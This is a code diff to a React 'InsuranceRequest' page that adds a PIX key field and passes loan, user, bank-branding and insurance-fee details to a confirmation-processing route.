@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { AlertTriangle, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
@@ -24,7 +23,8 @@ const InsuranceRequest = () => {
     installmentValue,
     interestRate,
     userName,
-    userCPF
+    userCPF,
+    pixKey
   } = location.state || {
     bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
     bankName: "Caixa Econômica Federal",
@@ -46,8 +46,21 @@ const InsuranceRequest = () => {
   };
 
   const handleSubmit = () => {
-    // Here you would handle the payment process
-    navigate('/dashboard');
+    // Navigate to the confirmation processing page
+    navigate('/confirmation-processing', {
+      state: {
+        bankLogo,
+        bankName,
+        totalAmount,
+        installmentsCount,
+        installmentValue,
+        interestRate,
+        userName: name || userName,
+        userCPF: cpf || userCPF,
+        pixKey,
+        insuranceAmount: 48.52
+      }
+    });
   };
 
   return (
